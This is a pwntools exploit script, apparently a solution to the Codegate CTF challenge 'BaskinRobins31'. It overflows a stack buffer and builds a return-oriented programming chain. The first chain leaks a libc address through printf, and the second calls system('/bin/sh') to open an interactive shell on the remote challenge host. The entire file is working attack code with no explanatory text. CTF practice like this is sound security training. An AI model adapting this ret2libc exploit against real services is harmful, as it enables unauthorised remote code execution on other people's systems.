from pwn import *
import time
import sys

def BaskinRobins31(DEBUG):
	t = 0.3
	
	if DEBUG=="1":
		t = 0.005
		r = process("./BaskinRobins31")
		offset_main_arena = 0x3c4af0
		offset_one_gadget = 0xf1117
		# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
		raw_input("debug?")
	elif DEBUG=="2":
		offset___libc_start_main = 0x0000000000020740
		offset_system = 0x0000000000045390
		offset_str_bin_sh = 0x18cd57
		# libc = ELF('./libc_64.so.6')
		HOST = 'ch41l3ng3s.codegate.kr'
		PORT = 3131
		r = remote(HOST,PORT)
	
	pop_rdi_ret = 0x400bc3 
	printf_plt = 0x4006E0
	printf_got = 0x602030
	__libc_start_main_got = 0x602048
	main = 0x400A4B
	# Author = "A"*0x40
	r.recvuntil("How many numbers do you want to take ? (1-3)")
	payload = "A"*0xb8
	payload += p64(pop_rdi_ret)
	payload += p64(__libc_start_main_got)
	payload += p64(printf_plt)
	payload += p64(main)
	r.sendline(payload)
	r.recvuntil("Don't break the rules...:( \n")
	
	res = r.recvuntil("#")[:-1]
	__libc_start_main = u64(res.ljust(8,"\x00"))
	log.info('__libc_start_main: %#x' % __libc_start_main)
	baselibc = __libc_start_main - offset___libc_start_main
	system = baselibc + offset_system
	bin_sh = baselibc + offset_str_bin_sh
	log.info('baselibc: %#x' % baselibc)
	log.info('system: %#x' % system)
	log.info('bin_sh: %#x' % bin_sh)
	
	payload = "A"*0xb8
	payload += p64(pop_rdi_ret)
	payload += p64(bin_sh)
	payload += p64(system)
	payload += p64(main)
	r.sendline(payload)
	r.interactive()

BaskinRobins31(sys.argv[1])

